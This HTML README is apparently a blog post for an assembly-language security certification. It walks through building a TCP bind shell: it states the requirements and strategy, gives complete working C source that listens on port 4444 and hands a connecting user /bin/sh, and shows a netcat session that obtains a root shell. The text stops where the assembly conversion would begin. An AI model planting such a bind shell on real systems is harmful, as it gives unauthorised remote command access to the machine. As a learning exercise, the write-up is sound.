exercise1/README.html
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>README</title>
<!-- 2016-12-21 Wed 15:55 -->
<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta  name="generator" content="Org-mode" />
<meta  name="author" content="Brett Lischalk" />
</head>
<body>
<div id="content">
<h1 class="title">README</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">1. Assignment 1</a>
<ul>
<li><a href="#sec-1-1">1.1. Requirements</a></li>
<li><a href="#sec-1-2">1.2. Strategy</a></li>
<li><a href="#sec-1-3">1.3. The Source Code</a></li>
<li><a href="#sec-1-4">1.4. The C program</a></li>
<li><a href="#sec-1-5">1.5. Analysis of the C program</a></li>
<li><a href="#sec-1-6">1.6. Assembly: Take 1</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><span class="section-number-2">1</span> Assignment 1</h2>
<div class="outline-text-2" id="text-1">
<p>
This blog post has been created for completing the requirements fo the SecurityTube
Linux Assembly Expert certification:
<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a>
</p>

<p>
Student ID: SLAE-824
</p>
</div>

<div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1"><span class="section-number-3">1.1</span> Requirements</h3>
<div class="outline-text-3" id="text-1-1">
<ul class="org-ul">
<li>Create a Shell Bind TCP shellcode
<ul class="org-ul">
<li>Bind to a port
</li>
<li>Execs Shell on incoming connection
</li>
</ul>
</li>
<li>Port number should be easily configurable
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2"><span class="section-number-3">1.2</span> Strategy</h3>
<div class="outline-text-3" id="text-1-2">
<p>
My approach to building a tcp bind shell shellcode will be to:
</p>

<ul class="org-ul">
<li>Create a C program which illustrates the basic functionality
</li>
<li>Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks
</li>
<li>Lookup the system calls and see what arguments and structures they take
</li>
<li>Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does
</li>
<li>Debug issues as of course there will be :)
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-1-3" class="outline-3">
<h3 id="sec-1-3"><span class="section-number-3">1.3</span> The Source Code</h3>
<div class="outline-text-3" id="text-1-3">
<p>
The source code and tools referenced in this article can be found here:
<a href="https://github.com/blischalk/slae/tree/master/exercise1">The Source Code and Tools</a>
</p>
</div>
</div>

<div id="outline-container-sec-1-4" class="outline-3">
<h3 id="sec-1-4"><span class="section-number-3">1.4</span> The C program</h3>
<div class="outline-text-3" id="text-1-4">
<p>
From my experience playing around with socket programming in C and
Python, there is a basic formula and group of function calls for
creating clients and servers. Most of them will be useful to us. A
couple won't be applicable to our situation.  The functions we will
find useful are:
</p>

<ul class="org-ul">
<li>Socket: Open a socket over which we will communicate. Essentially a file descriptor
</li>
<li>Bind: Bind our socket to an interface on our system
</li>
<li>Listen: Tell our system that we are ready to start accepting connections
</li>
<li>Accept: Accept the connection. This is a necessary next step as listen will generally queue up connections in anticipation of them being accepted
</li>
</ul>

<p>
Functions we won't worry about:
</p>

<ul class="org-ul">
<li>Send
</li>
<li>Recv
</li>
<li>Connect
</li>
<li>Close
</li>
</ul>

<p>
We won't worry about send or recv because they are used for managing
the flow of data coming in and out and acting accordingly.  We are
instead going to just redirect stdin, stdout, and stderr over the
socket using a function called dup2 and not worry about managing the
flow of data. Since we aren't connecting to another system/server we
don't need to worry about connect. And as for close, it is generally
good practice to close files after your done with them but one leaked
file descriptor won't hurt anyone right? We need to trim the fat!
</p>

<p>
The final step after we get our redirection going is we just need to
run a program, in our case <code>/bin/sh</code> and its output and input should
be connected to our socket. We can run this program using <code>execve</code>.
</p>

<p>
So lets get some code going!
</p>

<div class="org-src-container">

<pre class="src src-c" id="bindshell.c">  #include &lt;stdio.h&gt;
  #include &lt;netinet/in.h&gt;
  #define PORT 4444

  int main(int argc, char **argv) {
    // Create a socket
    int lsock = socket(AF_INET, SOCK_STREAM, 0);

    // Setup servr side config struct
    // We configure:
    // The family:IPv4
    // The interface: 0.0.0.0 (any)
    // The port: port#
    struct sockaddr_in config;
    config.sin_family = AF_INET;
    config.sin_addr.s_addr = INADDR_ANY;
    // The htons() function converts the
    // unsigned short integer hostshort from host byte
    // order to network byte order.
    config.sin_port = htons(PORT);

    // Bind the created socket with the interface
    // specified in the configuration
    bind(lsock, (struct sockaddr *)&amp;config, sizeof(config));

    // Listen on the socket
    listen(lsock, 0);

    // Accept the incoming connection
    int csock = accept(lsock, NULL, NULL);

    // Redirect stdin, stdout, and stderror
    dup2(csock, 0);
    dup2(csock, 1);
    dup2(csock, 2);

    // Execute a shell
    execve("/bin/sh", NULL, NULL);
};
</pre>
</div>

<p>
Compiling this code with <code>gcc bindshell.c -o bindshell</code> gives us a
nice executable. Running the executable with <code>./bindshell</code> and then
looking at our network using <code>netstat -antp</code> yields something very
interesting&#x2026;
</p>

<div class="org-src-container">

<pre class="src src-sh" id="netstat-output">root@blahblah:~# netstat -atp Active Internet connections (servers and
established) Proto Local Address Foreign Address State PID/Program
name tcp *:4444 *:* LISTEN 1657/bindshell
</pre>
</div>

<p>
Excellent! We have /bin/sh listen bound to a port. If we open up
another terminal and use netcat to connect to port 4444 by running <code>nc
-nv -nv 127.0.0.1 4444</code> we will get:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="netcat-output">root@blahblah:~# nc -nv 127.0.0.1 4444 (UNKNOWN) [127.0.0.1] 4444 (?)
open id uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>

<p>
Perfect! We have a tcp bind shell connection. Now we have to convert
this to assembly&#x2026;
</p>
</div>
</div>
